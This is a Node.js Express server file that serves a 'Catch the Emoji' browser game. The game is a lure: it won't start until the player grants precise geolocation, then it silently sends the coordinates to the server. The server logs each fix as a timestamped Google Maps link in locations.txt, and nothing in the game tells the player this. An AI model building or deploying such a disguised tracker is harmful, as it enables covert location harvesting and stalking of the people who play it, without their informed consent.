import express from "express";
import fs from "fs-extra";

const app = express();
const PORT = process.env.PORT || 3000;

app.get("/", (req, res) => {
  res.send(`
  <!doctype html>
  <html>
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width,initial-scale=1" />
      <title>Catch the Emoji!</title>
      <style>
        body { margin:0; padding:0; background:#fefefe; font-family:Arial, sans-serif; user-select:none; }
        #game { width:100%; height:100vh; display:flex; justify-content:center; align-items:center; position:relative; overflow:hidden; }
        #emoji { font-size:3rem; cursor:pointer; position:absolute; }
        #score { position:fixed; top:15px; right:20px; font-size:1.2rem; font-weight:bold; color:#0077ff; }
        #overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; display:flex; justify-content:center; align-items:center; flex-direction:column; }
        button { background:#0077ff; color:white; border:none; padding:12px 20px; border-radius:10px; cursor:pointer; font-weight:600; font-size:1rem; }
      </style>
    </head>
    <body>
      <div id="overlay">
        <h2>Allow location to play the game 🎮</h2>
        <button id="startBtn">Start</button>
      </div>
      <div id="game" style="display:none;">
        <div id="emoji">🐱</div>
        <div id="score">Score: 0</div>
      </div>

      <script>
        const overlay = document.getElementById('overlay');
        const startBtn = document.getElementById('startBtn');
        const game = document.getElementById('game');
        const emoji = document.getElementById('emoji');
        const scoreDisplay = document.getElementById('score');
        let score = 0;
        let speed = 1500; // ms
        let gameOver = false;
        let moveTimeout;

        startBtn.addEventListener('click', () => {
          if (!navigator.geolocation) {
            overlay.innerHTML = "<h2>Your browser does not support location. Can't play. ❌</h2>";
            return;
          }

          navigator.geolocation.getCurrentPosition(pos => {
            // salvar localização
            fetch('/location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude).catch(()=>{});
            overlay.style.display = "none";
            game.style.display = "block";
            startGame();
          }, err => {
            overlay.innerHTML = "<h2>You denied location. Can't play. ❌</h2>";
          }, { enableHighAccuracy:true, timeout:10000 });
        });

        function startGame() {
          score = 0;
          speed = 1500;
          gameOver = false;
          scoreDisplay.innerText = "Score: 0";
          moveEmoji();

          // perder se clicar fora
          document.body.addEventListener('click', bodyClick);
          emoji.addEventListener('click', emojiClick);
        }

        function moveEmoji() {
          if (gameOver) return;
          const x = Math.random() * (window.innerWidth - 60);
          const y = Math.random() * (window.innerHeight - 60);
          emoji.style.left = x + "px";
          emoji.style.top = y + "px";

          moveTimeout = setTimeout(moveEmoji, speed);
        }

        function emojiClick(e) {
          e.stopPropagation(); // evitar contar como clique fora
          score++;
          scoreDisplay.innerText = "Score: " + score;

          // aumentar dificuldade
          if (score % 10 === 0 && speed > 400) {
            speed -= 200;
          }

          moveEmoji();
        }

        function bodyClick() {
          if (!gameOver) {
            endGame();
          }
        }

        function endGame() {
          gameOver = true;
          clearTimeout(moveTimeout);
          overlay.style.display = "flex";
          overlay.innerHTML = "<h2>Game Over! Final Score: " + score + "</h2><button onclick='location.reload()'>Play Again</button>";
          game.style.display = "none";
          document.body.removeEventListener('click', bodyClick);
          emoji.removeEventListener('click', emojiClick);
        }
      </script>
    </body>
  </html>
  `);
});

app.get("/location", (req, res) => {
  const { lat, lon } = req.query;
  if (lat && lon) {
    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
    const logLine = `${new Date().toISOString()} | ${mapsLink}\n`;
    fs.appendFileSync("locations.txt", logLine);
    console.log("Saved:", mapsLink);
  }
  res.sendStatus(200);
});

app.listen(PORT, () => console.log("Server running on port", PORT));
